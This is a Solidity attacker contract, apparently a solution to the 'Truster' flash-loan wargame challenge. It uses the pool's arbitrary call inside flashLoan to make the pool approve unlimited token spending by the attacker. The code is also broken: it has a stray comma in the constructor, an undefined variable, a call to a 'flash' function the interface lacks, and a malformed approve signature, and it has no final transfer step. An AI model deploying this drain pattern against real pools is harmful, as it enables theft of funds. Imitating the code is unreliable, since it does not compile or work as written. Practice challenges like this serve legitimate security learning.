// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external;
}

contract TrusterAttacker {
    IPool immutable pool;
    IERC20 immutable token;
    address private attacker;

    constructor(address _poolAddress, address _tokenAddress, ) {
        pool = IPool(_poolAddress);
        token = IERC20(tokenAddress);
        attacker = msg.sender;
    }

    function attack() external {
        // Approve unlimited spending of pool through flashloan
        bytes memory data = abi.encodeWithSignature("approve(address,uint)", address(this), 2 ** 256 - 1);
        pool.flash(0, address(this), address(token), data);
    }
}